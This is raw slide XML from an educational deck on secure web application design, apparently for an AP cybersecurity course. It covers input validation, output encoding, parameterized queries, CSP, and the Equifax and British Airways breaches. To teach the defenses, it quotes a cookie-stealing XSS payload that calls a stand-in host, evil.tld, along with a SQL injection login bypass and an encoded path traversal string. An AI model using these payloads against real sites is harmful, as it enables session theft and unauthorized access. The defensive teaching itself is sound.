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5.5: Protecting Applications. Building an application that is defensible before anyone attacks it: secure by design and secure by default as engineering commitments, and input validation and output encoding as the mechanisms that make untrusted data safe to handle.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5.5. Open with this analogy before the mechanics: "Input validation is a bouncer who checks every ID at the door of a form field. The safest version trusts nothing it hasn't verified itself, rather than trying to memorize every possible fake ID a guest might try to sneak past."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breach post-mortems arrive at the same conclusion: the vulnerability was baked into the application during design, not introduced by a uniquely sophisticated adversary. Secure Web Application Design is the discipline of eliminating entire vulnerability classes at the point of construction rather than relying on perimeter controls like firewalls to catch exploitation after the fact.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Historically, application security was a downstream concern, developers wrote functional code, and a separate team tested it afterward under deadline pressure. This 'penetrate and patch' cycle is expensive: a defect caught during design costs roughly an order of magnitude less to fix than the same defect caught in production, echoing well-documented software defect economics.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Two companion principles operationalize secure-by-design thinking: secure-by-design means security is a primary constraint from the first architecture diagram, and secure-by-default means the out-of-the-box configuration is already the safest reasonable one, without requiring the customer to enable protections manually.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theoretical backbone of secure-by-design thinking is recognizing that a web application is fundamentally a trust boundary problem. Every web application accepts input from an inherently untrusted source, the end user's browser, and that input eventually crosses into a trusted execution context: a SQL query, an HTML page rendered to other users, a filesystem path, an operating system command, or an authorization decision.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The entire discipline of secure coding can be summarized as rigorously managing what happens at each of these boundary crossings. The OWASP Top 10, the industry's most widely cited taxonomy of application risk, is dominated by exactly these failures: injection, broken access control, cryptographic failures, and security misconfiguration are all, at their root, cases where untrusted input or an unsafe default was allowed to influence a trusted operation without adequate mediation.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conceptual pillar is defense-in-depth applied specifically to the application layer: input validation, output encoding, parameterized data access, and secure configuration are not redundant if implemented correctly, they are independent layers that each close a slightly different gap.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>A parameterized query prevents SQL injection even if input validation is imperfect. Output encoding prevents cross-site scripting even if an attacker manages to store malicious data. Secure default configurations limit blast radius even if a control elsewhere fails. This layering mirrors the network-security concept of defense-in-depth, but operates entirely within the boundaries of a single application's codebase.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>This is exactly why network controls and secure coding practices are complementary, not substitutable: a firewall cannot distinguish a legitimate SQL query from a malicious one, since both travel over an allowed port inside an encrypted session. Perimeter security stops what it can see; secure application design stops what perimeter security structurally cannot.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into technical mechanics, consolidate the five foundational terms: Secure Web Application Design, secure-by-design, secure-by-default, trust boundary, and defense-in-depth. Every subsequent slide in this deck, SDLC gates, input validation, output encoding, parameterized queries, CSP, is a concrete instantiation of these five ideas.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The unifying thread: security is not a filter bolted onto finished code, but a property engineered in from the first design decision, verified at every point where untrusted data crosses into a trusted operation, and reinforced by independent, redundant layers.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SDLC embeds discrete security checkpoints, or gates, into each phase of development so a project cannot silently advance with unresolved security risk. Requirements capture security needs (authentication strength, data classification, regulatory obligations) alongside functional ones. Design/Threat Modeling uses structured methodologies such as STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege) to enumerate how the system could be attacked, producing data-flow diagrams before a line of code is written.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Implementation requires developers to write against secure coding standards, use vetted libraries rather than hand-rolled cryptography or query construction, and undergo peer review. Verification/Testing runs automated Static Application Security Testing (SAST, analyzes source code without running it) and Dynamic Application Security Testing (DAST, probes the running app from outside) plus manual penetration testing. Release requires a final sign-off confirming critical/high findings are remediated. Response, aligned with NIST SP 800-218's 'Respond to Vulnerabilities' practice group, triages and patches newly discovered flaws on a defined timeline.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validation is the first line of defense at every trust boundary, checking that data received from a user or another system conforms to strict expectations before the application acts on it. The critical design decision is choosing between allowlisting and denylisting.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Allowlisting defines the exact, finite set of characters, formats, or values permitted, rejecting everything else by default. For a US ZIP code field, an allowlist might be 'exactly five digits', anything not matching is rejected outright. Denylisting instead defines known-bad patterns and permits everything else, which is structurally weaker: it requires the defender to anticipate every dangerous variation an attacker might invent, including case variation and encoding tricks.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Allowlisting is structurally superior because it defines security as the default state, while denylisting is a losing proposition given the near-infinite ways malicious payloads can be encoded or obfuscated.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particularly insidious failure mode is a canonicalization error, in which validation is performed on data before it has been fully decoded or normalized into its final form. If an application checks a submitted file path for the sequence '../' before URL-decoding the request, an attacker can submit '%2e%2e%2f', which passes the check because the literal string '../' is not present, but which decodes to '../' immediately afterward, reintroducing a path traversal vulnerability the filter was supposed to prevent.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The correct order of operations is: fully decode and normalize input to its canonical form first, then validate. Getting this order backward is one of the most common ways a seemingly correct filter is silently bypassed, because the validation logic and the interpretation logic are operating on two different representations of the same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runnable demo models the canonicalization bug directly. A naive filter checks a submitted path for the literal string '../' and rejects it if found, but the check runs before URL-decoding. We feed it the payload '%2e%2e%2f' and observe that it passes the naive filter, then decodes to a working traversal sequence.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The corrected version decodes the path first and then checks the canonical, fully-decoded form for '../' before it is ever used to access the filesystem. Run both functions against the same payload and compare the output, the fix is a two-line reordering, but it closes an entire vulnerability class.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encoding is the primary defense against cross-site scripting (XSS), and it must be context-aware because the same piece of data can be dangerous for different reasons depending on where it is rendered. In the HTML body context, encode &lt;, &gt;, &amp;, and quote characters as HTML entities so a user-supplied &lt;script&gt; tag renders as visible text rather than executing.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>In a JavaScript string context, escape quotes, backslashes, and line terminators so injected data cannot break out of a quoted string literal and inject new script statements. In a URL context, percent-encode reserved characters so injected data cannot alter the structure of a query string or redirect target. In an HTML attribute context, quote all attribute values and encode quote characters, since an unquoted attribute allows injection via whitespace alone.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following example, drawn directly from the topic's referenced SAST finding, contrasts a vulnerable reflection with a properly encoded one: an attacker-supplied query parameter reflected unsafely into an HTML page. In the vulnerable version, $_GET['username'] is concatenated directly into an &lt;h1&gt; tag and echoed to the page. An attacker requests profile.php?username=&lt;script&gt;fetch('https://evil.tld/steal?c='+document.cookie)&lt;/script&gt;, and that script executes in the victim's authenticated browser session the moment they load the page.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The secure version wraps the same value in htmlspecialchars($username, ENT_QUOTES, 'UTF-8') before echoing it. The identical payload is now rendered as literal, inert text, the browser displays the tag as visible text rather than parsing and executing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injection remains the canonical example of a trust-boundary failure: user input is concatenated directly into a command string that is then interpreted by a downstream engine as executable syntax rather than inert data. When username = request.form['username'] and password = request.form['password'] are concatenated into a raw SELECT statement, an attacker submitting admin' -- causes the resulting query to become SELECT id FROM users WHERE username = 'admin' -- ' AND password = '...', the trailing '--' comments out the password check entirely, bypassing authentication.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The defense is not 'better validation' of the input string, it is architectural: parameterized queries (also called prepared statements) separate the query's structure from its data at the protocol level, so no user-supplied value, regardless of what characters it contains, can ever be reinterpreted as SQL syntax.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secure version of the login query sends the fixed template SELECT id FROM users WHERE username = %s AND password_hash = %s to the database, with the untrusted values bound afterward as separate protocol fields. The database receives the query template and the untrusted values as separate channels, so 'admin' -- ' is bound as a literal string value to compare against the username column, it can never alter the query's logical structure, regardless of embedded quotes or comments.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The AP exam frequently presents a vulnerable concatenated query and asks for the single best remediation. The correct answer is almost always 'use parameterized queries / prepared statements,' not 'sanitize the input' or 'escape quote characters,' because escaping is a denylist-style patch that can be bypassed via encoding tricks or database-specific syntax, while parameterization is architectural and eliminates the vulnerability class entirely.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runnable demo makes the SQL injection abstraction concrete without a real database. A tiny Python list of user records stands in for a users table. The vulnerable function builds its match check the way a concatenated query would behave, detecting the comment-truncation pattern and returning a match regardless of password. The parameterized function instead performs an exact, literal comparison, exactly mirroring how a bound parameter is compared by a real database engine.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Run both functions against the same admin' -- payload and observe the contrast: the vulnerable path authenticates the attacker with no valid password, while the parameterized path correctly rejects it because no username in the data exactly matches the literal string "admin'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Secure-by-default configuration means an application ships already hardened: unnecessary services disabled, default administrative credentials removed, verbose error messages suppressed in production, and permissions granted on a least-privilege basis by default rather than requiring an administrator to manually lock things down after installation. If a component only needs to read a table, it should not have write or delete permissions on that table.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>A system that 'fails closed', denying access when a control cannot make a clear decision, such as an expired session or an unreachable authorization service, is markedly safer than one that 'fails open' and grants access by default under ambiguous conditions. Fail-closed bounds the worst-case outcome of an unexpected failure to 'legitimate access temporarily denied' rather than 'unauthorized access silently granted.'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effective secure-default browser controls available to web applications is the Content-Security-Policy header, which acts as a browser-enforced allowlist for where active content is permitted to load from. default-src 'self' is the fallback policy, only load content from the application's own origin unless overridden. script-src 'self' https://cdn.trusted-vendor.com means scripts may only execute if served from the app's own origin or one explicitly named vendor CDN, an attacker-injected inline script tag, or one pointing at an attacker-controlled domain, is blocked outright by the browser even if it made it into the page's HTML.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>object-src 'none' disables legacy plugin content (Flash, Java applets), closing an old but still-relevant attack surface. frame-ancestors 'none' prevents the page from being embedded in an iframe on another site, mitigating clickjacking. CSP is a defense-in-depth layer, it does not replace output encoding, but substantially reduces the impact if encoding fails somewhere.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interactive demo renders a simulated page with a live CSP meta tag and two script tags: one same-origin, one from a trusted CDN, and a third injected inline script representing an XSS payload. Toggle the script-src directive between different values and observe in the console output which scripts the browser reports as blocked versus allowed.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>With script-src 'self' https://cdn.trusted-vendor.com, the same-origin and CDN scripts execute normally while the injected inline script is blocked and logged as a CSP violation. Removing the CDN origin from the policy blocks that legitimate script too, illustrating that CSP correctness requires balancing security against breaking real functionality, an overly broad policy (or none at all) leaves the door open; an overly narrow one breaks the site.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covered the mechanics that operationalize secure-by-design: the SDLC's staged gates, allowlist-based input validation, the canonicalization ordering trap, context-aware output encoding against XSS, parameterized queries against SQL injection, and CSP as a browser-enforced runtime allowlist.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Notice the pattern across all five technical controls: each one closes a trust-boundary crossing at a different point in the pipeline, design time (threat modeling), input time (validation), output time (encoding), query-construction time (parameterization), and browser-render time (CSP). No single control is sufficient alone; together they form defense-in-depth at the application layer.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2017, the Apache Software Foundation disclosed CVE-2017-5638, a critical remote code execution flaw in the Apache Struts web framework, which Equifax used to power an online dispute portal. A patch was available within days, but Equifax's internal vulnerability management process failed to identify and patch the affected servers, and the flaw remained exploitable in production for over two months. Attackers exploited the unpatched instance beginning in mid-May 2017 and exfiltrated the personal data of approximately 147 million individuals.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>From the perspective of Secure Web Application Design, Equifax illustrates a failure at the Response gate of the SDLC: a working patch existed, but the organization's asset inventory and patch management processes could not reliably identify which systems needed it. Investigations also identified an expired digital certificate that prevented intrusion-detection tooling from decrypting and inspecting traffic for over a year, and insufficient network segmentation that let attackers pivot from the dispute portal into unrelated sensitive databases. Equifax ultimately paid a global settlement exceeding $575 million.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August–September 2018, attackers affiliated with Magecart, a web-skimming threat cluster, compromised the British Airways website by modifying a JavaScript file loaded by the payment page. The injected script, only 22 lines, silently captured customer name, address, and full payment card details (including CVV) as they were typed into the legitimate checkout form, transmitting that data in real time to an attacker-controlled server. Because the skimming script executed within the trusted context of the airline's own domain, standard payment-security controls like TLS and PCI-DSS network segmentation provided no protection, the theft happened entirely client-side, before the card data ever reached British Airways' servers.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Approximately 380,000 customer payment transactions were affected. The UK Information Commissioner's Office fined British Airways £20 million under GDPR, citing inadequate security testing and insufficient controls over third-party scripts on the payment page. A properly scoped script-src CSP directive would have prevented the browser from executing a script injected from, or exfiltrating data to, a domain not on the airline's explicit allowlist. SRI hashing on every first-party script would have caused the browser to reject the tampered file the instant its content diverged from the expected hash.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that have successfully shifted security left, embedding SAST scanning directly into CI/CD pipelines, requiring peer review of every pull request against a secure coding checklist, and running automated Software Composition Analysis on every build, report dramatically shorter mean time-to-remediate for newly discovered flaws. This is the practical realization of the SDLC's Verification gate: automated compiler and static-analysis rule checks act as a continuously running, low-cost proxy for the manual code review that does not scale across thousands of daily commits.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The exact scenario referenced earlier, a SAST alert flagging 'Insecure input reflection on page profile.php', is precisely the class of vulnerability this pipeline is designed to catch before code ever reaches a production branch, contrasted directly against Equifax's Response-gate failure and the British Airways case's missing runtime controls.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case studies share a structural lesson: the necessary technical control was known, documented, and available, a Struts patch, a CSP header, SRI hashing, but was not in place at the moment of compromise. Neither breach required a novel or undiscovered vulnerability class; both were failures to apply established secure-design practices consistently.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>This is the strongest argument for treating secure web application design as a continuous organizational discipline (SDLC gates, DevSecOps pipelines) rather than a one-time technical fix, since even correct technical knowledge does not protect an organization if it isn't operationalized into every release.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formalize secure web application design through layered technical, procedural, and organizational controls. The first layer is server-side input enforcement: all validation logic must execute on the server, regardless of what client-side checks exist for user experience purposes, since browser-based JavaScript validation is trivially bypassed by crafting raw HTTP requests with tools like Burp Suite or curl, the browser is never involved.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Validation should default to allowlisting known-good formats, and all decoding/canonicalization must occur before validation logic runs, closing the canonicalization bypass class covered earlier. A recurring misconception is that a single well-written server-side filter is sufficient; it is not, even correct server-side input validation must be paired with output encoding and parameterized queries as independent, redundant layers, because input validation alone cannot anticipate every downstream context a piece of data will be used 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point where untrusted data is written into a response, HTML body, HTML attribute, JavaScript context, URL, or CSS, must apply the encoding function specific to that context. Modern web frameworks apply HTML-context encoding automatically by default, which is itself an application of the secure-by-default principle; developers must actively opt out (e.g., React's dangerouslySetInnerHTML) to reintroduce risk, making the unsafe path visibly deliberate rather than an easy accidental default.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>This is a direct illustration of how framework design choices operationalize secure-by-design at scale: rather than relying on every individual developer to remember to encode output correctly every time, the framework encodes by default and requires an explicit, loudly-named opt-out to disable that protection.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enforce parameterized queries through code review gates and SAST rules that flag any direct string concatenation feeding into a database driver's execute method, regardless of whether the specific input appears attacker-controlled, treating the pattern itself, not just demonstrated exploitability, as the defect.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>This is a deliberately conservative standard: a query that concatenates a value which happens to be hardcoded today is still flagged, because code evolves and a currently-safe concatenation pattern can become attacker-controlled the moment someone adds a new caller that passes in user input. Treating the pattern as categorically forbidden, rather than auditing each instance for current exploitability, removes the need to re-verify safety every time the surrounding code changes.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should be provisioned from a hardened configuration baseline (e.g., CIS Benchmarks) that disables unused services, removes default credentials, enforces least-privilege file and database permissions, and fails closed on ambiguous authorization decisions. HTTP Strict Transport Security (HSTS) should be enabled by default for any application handling authentication or sensitive data, it instructs browsers to only ever connect to a site over HTTPS, even if the user types 'http://' or clicks an unencrypted link, for a specified duration, preventing downgrade and man-in-the-middle interception of what should be an encrypted session.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>This topic's study guide decision framework states the pattern directly: 'If external public networks sniff client session headers → Enforce HTTPS HSTS and VPN tunnels', HSTS is the browser-side enforcement mechanism that makes 'always HTTPS' a guarantee rather than a hope dependent on every link being typed correctly.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OWASP Application Security Verification Standard (ASVS) and the OWASP Software Assurance Maturity Model (SAMM) give organizations a structured way to measure and mature their SDLC practices over time, rather than treating secure design as a one-time certification. ASVS organizes requirements into 14 categories, including V5 (Validation, Sanitization and Encoding) and V9 (Communications), and provides three increasing levels of rigor an organization can audit a specific application against.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>SAMM, by contrast, assesses the maturity of an organization's overall software security program across five business functions: Governance, Design, Implementation, Verification, and Operations. The key distinction is scope: ASVS audits one application against a checklist; SAMM assesses whether the organization's processes that produce all its applications are maturing over time.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exam asks how to prevent a vulnerability class like injection or XSS, always answer in layers: an architectural control (parameterized queries or context-aware output encoding), which eliminates the vulnerability class structurally; a procedural control (SAST/DAST gates in the SDLC) that catches violations before release; and a runtime control (CSP, WAF, secure default configuration) that reduces impact if the first two layers fail. A single-layer answer such as 'just sanitize input' will not earn full credit.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>This three-layer framework is not just an exam heuristic, it mirrors how mature organizations actually structure application security programs, matching the pattern seen across both case studies: Equifax's failure spanned the procedural layer (patch management), while British Airways' failure spanned the runtime layer (missing CSP/SRI), even though both incidents ultimately trace back to a missing or unapplied architectural-adjacent control.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translated the technical mechanisms of Section II into organizational, enforceable standards: server-side-only validation, secure-by-default framework encoding, categorical enforcement of parameterization, configuration baselines with fail-closed defaults and HSTS, and compliance frameworks (ASVS for applications, SAMM for organizations) that formalize continuous improvement rather than one-time certification.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>The through-line connecting every hardening control back to the case studies: Equifax and British Airways both had the necessary technical knowledge available industry-wide, but lacked the organizational enforcement mechanisms (patch management processes, CSP/SRI deployment standards) that would have applied that knowledge consistently and automatically rather than depending on individual vigilance.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architectural, procedural, and runtime prevention controls covered so far, mature security programs also instrument detection: a malformed SQL injection attempt that fails to balance quotes correctly often throws a parser exception, logged as a syntax error a SOC analyst can review. Similarly, a properly configured CSP can be deployed with a report-uri or report-to directive that sends violation reports to a monitoring endpoint even while the policy is actively enforcing (blocking) violations, giving defenders visibility into attempted XSS exploitation even when the browser successfully blocked it.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Asset inventory tooling that continuously tracks framework and library versions in production directly addresses the Equifax failure mode: detecting patch-gap drift (a server still running a known-vulnerable version after a patch has been published) before an attacker finds it. Detection does not replace prevention, it catches what prevention missed or provides confirmation that prevention is working as intended.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the topic's full toolkit to four short scenarios. Scenario A: a login form checks input length server-side but is still bypassed by admin' -- ; the missing control is architectural, parameterized queries, since length validation alone does not prevent structural query manipulation. Scenario B: a comment field's contents render into every subsequent visitor's page unencoded; the missing control is context-aware output encoding at the point of HTML rendering.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Scenario C: a published patch for a critical framework CVE existed but was never applied for two months (mirroring Equifax); the missing control is procedural, asset inventory and patch management as part of the SDLC's Response gate. Scenario D: a modified first-party script silently exfiltrated data to an attacker domain (mirroring British Airways); the missing controls are runtime, a scoped CSP connect-src directive and SRI hashing on the script tag.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vulnerability class in this topic follows the same five-stage kill chain. Reconnaissance: the attacker identifies where the application reflects input unsafely, which framework version is running, or which security headers (CSP, HSTS) are absent, exactly the reconnaissance that preceded the Equifax and British Airways compromises. Weaponization: the attacker crafts a payload matched to the specific gap found, a SQL tautology, an XSS script tag, or a crafted header exploiting a known CVE.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Delivery/Exploitation: the payload crosses a trust boundary that lacked adequate mediation, unvalidated input, unencoded output, an unpatched framework. Execution: the fundamental failure at the heart of this entire topic occurs, data becomes code, whether interpreted by a database engine, a victim's browser, or an operating system shell. Impact: the consequence materializes, authentication bypass, session hijacking, mass data exfiltration, or full remote code execution, exactly as seen in every case study this topic examined.</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Every control covered in this deck, SDLC gates, allowlisting, canonicalization ordering, parameterization, context-aware encoding, CSP, SRI, patch management, exists to break this chain at a specific stage, and the earlier in the chain a control intervenes, the less damage the attack can ultimately cause.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confirm fluency across five checkpoints. First, the SDLC gate order (Requirements, Design/Threat Modeling, Implementation, Verification, Release, Response) and which security activity belongs to each, a frequent exam trap tests whether you place SAST in Verification (correct) versus Implementation (incorrect).</a:t>
            </a:r>
          </a:p>
          <a:p/>
          <a:p>
            <a:r>
              <a:t>Second, the allowlist-over-denylist argument and the canonicalization ordering rule (decode fully, then validate). Third, the specific remediation for each major vulnerability class: parameterized queries for SQL injection, context-aware output encoding for XSS, never 'just sanitize' as a standalone answer. Fourth, the precise distinction between CSP (restricts which origins may supply/receive content) and SRI (verifies content hasn't been tampered with), illustrated concretely by the British Airways case. Fifth, and most heavily tested: always answer prevention questions in three layers, architectural, procedural, and runtime, as modeled by the layered-answer framework.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5: SECURING APPLICATIONS AND DATA</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5.5: Secure Web Application Design</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Building an application that is defensible before anyone attacks it: secure by design and secure by default as engineering commitments, and input validation and output encoding as the mechanisms that make untrusted data safe to handle.</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2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5.5.A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Identify the principles of secure by design and secure by default, and recognize them in the way a product is built and shipped.</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5.5.B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how sanitizing user input protects an application, and what sanitization can and cannot accomplish on its own.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Rectangle 9"/>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Input Sanitization and Parameterization Pipeline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USER INPUT</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="TextBox 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="55720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Request payloads submitted via HTTP form data/POST fields.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="10" name="Connector 9"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="260072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266672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4372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372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283372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FORM FILTERING</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="TextBox 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="284372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Web application runs immediate format check against safe character allowlists.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="16" name="Connector 15"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="488724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95324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3024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24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512024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SANITIZATION</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="TextBox 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="513024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Encodes special character syntax parameters (HTML entities escaping).</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="22" name="Connector 21"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="717376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723976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676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76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740676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PARAMETERIZATION</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="TextBox 26"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="741676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Parameters are bound separate from compiled AST database commands.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="28" name="Connector 27"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="946028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952628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0328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328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05</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="TextBox 31"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="969328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SAFE QUERY RUN</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="TextBox 32"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="970328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Database executes query safely, output is escaped to prevent XSS.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Input validation is a bouncer who checks every ID at the door of a form field. The safest version trusts nothing it hasn't verified itself, rather than trying to memorize every possible fake ID a guest might try to sneak past.</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Secure by Design, Not Secure by Patch</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Secure by Design, Not Secure by Patch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idea:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Secure Web Application Design eliminates vulnerability classes at construction time, not after deployment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old model:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> 'Penetrate and patch', write functional code, test afterward, fix under deadline pressure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Cost economics:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> A defect caught at design costs roughly an order of magnitude less to fix than one caught in production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 companion principles:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Secure-by-design (security is a primary design constraint) and secure-by-default (safest configuration ships out of the box)</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Formalized by:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> CISA's 2023 'Secure by Design' pledge and NIST SP 800-218 (Secure Software Development Framework)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Web Application as a Trust Boundary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Trust boundary:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> The line separating data/code a system trusts from data it must validate before use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Where it lives:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Between the user's browser (untrusted) and the server's business logic/database (trusted)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Every crossing matters:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> A SQL query, a rendered HTML page, a filesystem path, an OS command, an authorization decision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Top 10:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> The industry's ranked risk taxonomy, dominated by trust-boundary failures (injection, broken access control, misconfiguration)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discipline in one sentence:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Rigorously manage what happens at every trust-boundary crossing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Defense-in-Depth at the Application Layer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Definition:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Multiple independent controls each address the same risk, so one control's failure doesn't cause full compromise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Application-layer layers:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t> Input validation, output encoding, parameterized data access, secure configuration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Independence matters:</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1300" b="0" i="0">
                <a:solidFill>
                  <a:srgbClr val="3F3F3F"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
              </a:rPr>
